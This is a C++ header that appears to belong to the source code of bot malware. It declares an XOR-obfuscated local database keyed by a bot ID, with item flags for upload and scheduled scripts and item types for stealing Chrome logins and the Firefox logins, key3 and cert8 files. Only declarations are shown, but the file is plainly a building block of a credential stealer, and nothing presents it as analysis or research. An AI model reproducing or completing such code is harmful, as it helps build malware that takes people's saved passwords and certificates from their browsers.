#pragma once

#define INFODATABASE_MAGIC "~BZ"
#define MUTEX_INFODATABASE 0x50731

namespace InfoDatabase
{
	enum
	{
		ITEM_FLAG_UNIQUE = 0x00000001,
		ITEM_FLAG_UPLOAD = 0x00000002,
		ITEM_FLAG_POP    = 0x00000004,
	};

	enum
	{
		TYPE_SCRIPT							= 30,
		TYPE_CRYPTED_SCRIPT					= 31,
		TYPE_CRON_SCRIPT					= 35,
		TYPE_LOG_ERROR						= 40,
		TYPE_SCRIPT_STEAL_CHROME			= 50,
		TYPE_SCRIPT_STEAL_FIREFOX_LOGINS	= 51,
		TYPE_SCRIPT_STEAL_FIREFOX_KEY3		= 52,
		TYPE_SCRIPT_STEAL_FIREFOX_CERT8		= 53,
	};

	#pragma pack(push, 1)
	typedef struct
	{
		char garbage[18];
		char xorHkey;
		char magic[3];
		char botId[16];
		SYSTEMTIME installDate;
		unsigned long itemsSize;
		unsigned int itemCount;
	}info_database_header_t;

	typedef struct
	{
		unsigned short type;
		unsigned int size;
		unsigned int flags;
		char xorKey;
	}info_database_item_header_t;
	#pragma pack(pop)

	typedef struct
	{
		info_database_header_t header;
		WCHAR path[MAX_PATH];
	}info_database_t;

	typedef struct
	{
		unsigned int itemNumber;
		unsigned long currentItemHeaderOffset;
		info_database_item_header_t currentItemHeader;
		char * itemData;
	}info_database_item_cursor_t;

	void init();
	void uninit();
	bool createDefaultDatabase(const LPWSTR pathHome, const LPWSTR databaseFile, info_database_t * infoDatabase);
	bool _saveDatabaseHeader(info_database_t * infoDatabase, bool useMutex=true);
	bool loadDatabase(const LPWSTR pathHome, const LPWSTR databaseFile, info_database_t * infoDatabase);
	bool addItem(info_database_t * infoDatabase, unsigned short type, unsigned int size, unsigned int flags, const char * buffer);
	bool _saveItemHeader(const info_database_t * infoDatabase, const info_database_item_header_t * header, unsigned long headerOffset);
	bool _readItemHeader(const info_database_t * infoDatabase, unsigned long headerOffset, info_database_item_header_t * itemHeader);
	bool _readItemData(const info_database_t * infoDatabase, info_database_item_header_t * itemHeader, unsigned long offset, char * buffer);
	bool firstItem(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor);
	bool nextItem(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor);
	bool openItem(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor);
	bool saveItemHeader(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor);
	void closeItem(info_database_item_cursor_t * cursor);
	bool hasItemOfType(const info_database_t * infoDatabase, unsigned short type);
	bool nextItemOfType(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor, unsigned short type);
	bool nextItemWithFlag(const info_database_t * infoDatabase, info_database_item_cursor_t * cursor, unsigned int flag);
};